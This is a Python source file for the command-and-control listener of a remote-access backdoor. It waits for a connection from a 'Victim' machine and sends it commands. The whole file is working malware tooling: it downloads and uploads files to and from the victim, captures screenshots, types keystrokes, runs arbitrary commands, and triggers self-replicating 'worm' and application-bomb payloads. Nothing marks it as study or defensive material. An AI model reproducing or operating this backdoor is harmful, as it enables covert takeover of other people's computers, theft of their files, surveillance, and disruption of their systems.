import argparse
import socket
import json
import subprocess
import base64

# Commands:-hello

# cd directory_name - to override normal cmd cd coz that doesnt work
# exit - exit out of the backdoor safely (TODO to work more on that)
# worm abomb - application bomber (add custom applications if u want)
# worm fbomb - writes and executes a repeating worm
# screenshot - literally does that
# type the_text - literally does that
# press enter - literally does that
# execute bat_command - to write and execute custom bat commands, used to avoid commands that require the application to close or something

def args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-ip", dest="IP", help="The IP address of the Victim")
    parser.add_argument("-p", "--port", dest="listen_port", help="The Port to listen for incoming connections")
    return parser.parse_args()


def send(cmd):
    cmd = json.dumps(cmd)
    cmd = bytes(cmd, 'utf-8')
    connection.send(cmd)


def recv():
    final = ""
    while True:
        try:
            data = connection.recv(1024)
            data = data.decode('utf-8')
            final = final + data
            last = json.loads(final)
            return last
        except ValueError:
            continue


def write(file, content):
    if not content == "\n[-]Wrong Data,Check your command!\n":
        path = "E:\\MALWARE\\" + file #This path is important for uploading and dowloading files from victim's PC **SHOULD BE CHANGED FOR DIFFERENT PC***
        content = bytes(content, 'utf-8')
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        print("\n[+]File saved to " + path + "\n")
    else:
        print("\n[+]Failed to download file...\n")


def read(path):
    while True:
        try:
            path = "E:\\MALWARE\\" + path #This path is important for uploading and dowloading files from victim's PC **SHOULD BE CHANGED FOR DIFFERENT PC***
            with open(path, "rb") as file:
                return base64.b64encode(file.read())
        except FileNotFoundError:
            print("\n[+]No such File...\n")
            return b" "


arguments = args()
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind((arguments.IP, int(arguments.listen_port)))
listener.listen(1)
print("\n[+]Waiting for incoming connection...\n")
connection, address = listener.accept()
print("[+]Got connection from ", address[0], " at ", address[1], "\n\n")
image_id = 1
while True:
    try:
        cmd = input(">>")
        cmd = cmd.split(" ")
        if cmd[0] == "exit":
            send(cmd)
            connection.close()
            exit()
        elif cmd[0] == "clear":
            subprocess.call(["cls"], shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            continue
        elif cmd[0] == "download":
            send(cmd)
            result = recv()
            write(cmd[1], result)
            continue
        elif cmd[0] == "upload":
            send(cmd)
            response = recv()
            print(response)
            result = read(cmd[1])
            result = result.decode('utf-8')
            send(result)
            response = recv()
            print(response)
            continue
        elif cmd[0] == "worm" and cmd[1] == "fbomb":
            send(cmd)
            print(recv())
            send(" ")
            print(recv())
            continue
        elif cmd[0] == "worm" and cmd[1] == "abomb":
            send(cmd)
            print(recv())
            send(" ")
            print(recv())
            continue
        elif cmd[0] == "screenshot":
            file_name = str(image_id) + ".png"
            send(cmd)
            result = recv()
            write(file_name, result)
            print("[+]Screenshot saved...\n")
            image_id = image_id + 1
            continue
        send(cmd)
        result = recv()
        print(result)
    except Exception:
        continue